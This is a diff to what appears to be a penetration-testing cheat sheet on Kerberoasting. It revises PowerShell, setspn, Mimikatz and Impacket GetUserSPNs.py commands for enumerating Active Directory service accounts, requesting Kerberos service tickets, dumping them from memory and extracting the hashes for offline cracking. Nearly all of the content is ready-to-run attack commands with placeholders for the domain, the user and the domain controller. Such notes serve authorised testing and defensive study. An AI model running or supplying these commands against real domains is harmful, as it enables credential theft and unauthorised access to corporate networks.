@@ -9,14 +9,12 @@ Send a request to a TGT for a Kerberos token, dump it from memory, crack it loca
 Vulnerable users in domain
 
 ```
-Get-NetUser -SPN | select serviceprincipalname    //Powerview
-setspn -T <domain> -Q */*                         //Builtin
-```
+Get-NetUser | Where-Object {$_.servicePrincipalName} | fl
 
-Enumerate with LDAP Powershell module
+get-adobject | Where-Object {$_.serviceprincipalname -ne $null -and $_.distinguishedname -like "*CN=Users*" -and $_.cn -ne "krbtgt"}
+get-adobject -filter {serviceprincipalname -ne $null} -prop serviceprincipalname
 
-```
-$ldapFilter="(&(objectClass=user)(objectCategory=user)(servicePrincipalName=*))";$domain=New-Object System.DirectoryServices.DirectoryEntry;$search=New-Object System.DirectoryServices.DirectorySearcher;$search.SearchRoot=$domain;$search.PageSize=1000;$search.Filter=$ldapFilter;$search.SearchScope="Subtree";$results=$search.FindAll()$Results=foreach($result in $results){$result_entry=$result.GetDirectoryEntry();$result_entry|Select-Object @{Name="Username";Expression={$_.sAMAccountName}},@{Name="SPN";Expression={$_.servicePrincipalName|Select-Object -First 1}}}$Results;
+setspn -T <domain> -Q */*
 ```
 
 Enumerate past remote sessions on local machine
@@ -28,7 +26,8 @@ klist
 Request a Service Ticket from the target. The ticket will be stored in memory
 
 ```
-Add-Type -AssemblyName System.IdentityModel;New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "<SPN>"
+Add-Type -AssemblyName System.IdentityModel  
+New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "<SPN>"
 ```
 
 Dump the SPN ticket using Mimikatz
@@ -51,7 +50,7 @@ GetUserSPNs.py -dc-ip <DC IP> <domain>/<user>    #query the DC
 Dump TGT
 
 ```
-GetUserSPNs.py <domain>/<user>:<pass> -dc-ip <DC IP> -request  #dump TGTs of current user
+GetUserSPNs.py <domain>/<user>:<pass> -request  #dump TGTs of current user
 GetUserSPNs.py -dc-ip <DC IP> <domain>/<user> -request-user <target user> #dump TGTs of target user
 ```
 
